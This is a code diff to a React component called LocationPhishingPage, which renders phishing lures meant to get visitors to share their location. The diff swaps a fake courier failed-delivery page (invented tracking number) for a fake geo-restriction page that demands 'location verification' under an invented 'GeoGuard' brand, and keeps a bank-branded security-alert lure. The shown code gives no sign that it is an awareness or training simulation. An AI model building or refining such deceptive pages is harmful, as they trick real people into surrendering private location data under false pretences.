@@ -21,14 +21,15 @@ interface TemplateContent {
 }
 
 const templateContent: Record<string, TemplateContent> = {
-  'package-delivery-issue': {
-    title: 'Resolve Package Delivery - Global Swift Logistics',
-    actionText: 'Verify Delivery Address & Reschedule',
-    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery with Global Swift Logistics.",
-    pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
-    heroIcon: Truck,
-    brandName: "Global Swift Logistics",
-    brandLogo: <Package className="h-7 w-7 text-blue-600 mr-2" />,
+  // 'package-delivery-issue' is now replaced by 'restricted-website-access'
+  'restricted-website-access': {
+    title: 'Access Restricted - Location Verification Required',
+    actionText: 'Verify Location & Access Site',
+    message: "This website cannot be viewed in all countries. Verify your location to gain access.",
+    pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
+    heroIcon: Globe, // Using Globe, can be combined with Lock visually in render
+    brandName: "Restricted Website Access",
+    brandLogo: null,
   },
   'security-alert': {
     title: 'Security Alert - SecureNet Banking',
@@ -155,46 +156,18 @@ export default function LocationPhishingPage() {
     return (
       <div className="space-y-4">
         {content.brandName && ( // Display brandName if it exists
-          <div className={`flex items-center justify-center text-gray-700 mb-3 w-full ${templateId === 'content-unlock' ? 'text-2xl font-bold' : 'text-xl font-semibold'}`}>
-            {content.brandLogo} {/* This will be null for content-unlock now */}
-            <span className={`${templateId === 'content-unlock' ? 'text-center' : ''}`}>{content.brandName}</span>
+          <div className={`flex items-center justify-center text-gray-700 mb-3 w-full ${
+            (templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-2xl font-bold' : 'text-xl font-semibold'
+          }`}>
+            {content.brandLogo}
+            <span className={`${(templateId === 'content-unlock' || templateId === 'restricted-website-access') ? 'text-center' : ''}`}>{content.brandName}</span>
           </div>
         )}
         {/* The main title for the page is set by PhishingPageLayout's title prop.
             The content.message or specific descriptive texts are used below within each scenario.
         */}
 
-        {templateId === 'package-delivery-issue' && (
-          <div className="space-y-6 text-center">
-            <HeroIcon className="w-20 h-20 text-primary mx-auto mb-4" />
-            <p className="text-xl text-muted-foreground leading-relaxed">
-              {content.message}
-            </p>
-            <ShadcnCard className="text-left bg-secondary/20 shadow-sm p-4 sm:p-6">
-              <CardHeader className="p-0 mb-3">
-                <ShadcnCardTitle className="text-lg font-semibold text-foreground">Package Status Update:</ShadcnCardTitle>
-              </CardHeader>
-              <CardContent className="p-0">
-                <div className="grid grid-cols-[auto_1fr] gap-x-4 gap-y-2 text-sm sm:text-md">
-                  <span className="font-medium text-muted-foreground">Tracking ID:</span>
-                  <span className="text-foreground font-mono bg-muted/50 px-2 py-0.5 rounded-sm">#TZ78391B</span>
-
-                  <span className="font-medium text-muted-foreground">Status:</span>
-                  <span className="font-semibold text-destructive flex items-center">
-                    <AlertTriangle className="w-4 h-4 mr-1.5 flex-shrink-0" />
-                    Delivery Attempt Failed
-                  </span>
-
-                  <span className="font-medium text-muted-foreground">Last Update:</span>
-                  <span className="text-foreground">{currentTime || 'Fetching time...'}</span>
-                </div>
-              </CardContent>
-            </ShadcnCard>
-            <p className="text-md text-muted-foreground/90 pt-2">
-              {content.pageSpecificMessage}
-            </p>
-          </div>
-        )}
+        {/* Removed 'package-delivery-issue' specific rendering block */}
 
         {templateId === 'security-alert' && (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
@@ -223,10 +196,16 @@ export default function LocationPhishingPage() {
           </Alert>
         )}
 
-        {templateId === 'content-unlock' && (
+        { (templateId === 'content-unlock' || templateId === 'restricted-website-access') && (
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
-              <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
+              {templateId === 'restricted-website-access' ?
+                <div className="flex justify-center items-center text-primary/70">
+                  <Globe className="w-16 h-16 mx-auto" />
+                  <Lock className="w-8 h-8 -ml-5 -mt-8 opacity-70" />
+                </div>
+                : <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
+              }
               <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
@@ -258,6 +237,11 @@ export default function LocationPhishingPage() {
             {templateId === 'content-unlock' && (
               <p className="text-center text-sm text-gray-500 mb-2">
                 Powered by GeoLock<sup>&trade;</sup>
+              </p>
+            )}
+            {templateId === 'restricted-website-access' && (
+              <p className="text-center text-sm text-gray-500 mb-2">
+                Verification by GeoGuard<sup>&trade;</sup>
               </p>
             )}
             <Button
